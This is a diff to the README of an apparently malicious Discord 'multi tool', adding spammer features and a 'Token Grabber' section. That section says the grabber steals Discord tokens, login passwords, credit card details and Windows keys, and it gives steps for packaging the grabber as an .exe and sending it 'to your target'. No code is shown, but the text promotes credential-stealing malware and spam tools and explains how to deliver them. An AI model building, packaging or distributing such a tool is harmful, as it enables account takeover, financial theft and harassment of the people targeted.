@@ -4,6 +4,7 @@
 
 ### Features:
 
+- `Most Advanced Multi Tool!`
 - `Spammer`
 - `DM Spammer`
 - `Friend Spammer`
@@ -33,7 +34,10 @@
 - Make sure to have [Python](https://www.python.org/downloads/) 3.10.0 before Downloading! 
 
 ![image](https://user-images.githubusercontent.com/94531396/144041711-9ae57771-8073-4be2-b711-83f04a0c90cc.png)
+
 - Also make sure to have python added to [PATH](https://datatofish.com/add-python-to-windows-path/)
+
+![image](https://user-images.githubusercontent.com/94531396/144043762-62686438-ddf5-40fb-a0a2-d2834daaa660.png)
 
 ## ❗  - Installation:
 #### 1st・Installation (Source Code)
@@ -51,3 +55,25 @@ Drag it out to desktop and extract it
 Open GANG.exe
 ```
 
+#### [21] Token Grabber
+- Token
+- Username
+- Their discord token from all their accounts they have
+- All login passwords in the .zip file!
+- All of their credit card info (.zip file)
+- Windows key in (.zip file)
+
+![image](https://user-images.githubusercontent.com/94531396/144045656-b8483f78-2078-4195-9cc9-4afdfcad72e9.png)
+
+
+#### How to make the token grabber into an .exe
+```
+Create the token grabber
+Rename the file to what ever you want it to say
+tap "Edit" on the "Build .exe.bat"
+Select "Edit with Notepad"
+Delete "(FILE NAME!)" and change it to what you named your token grabber file
+once doing that tap: Ctrl + S to save
+Run the Build .exe.bat
+The .exe will be created in "dist" (Send that to your target)
+```
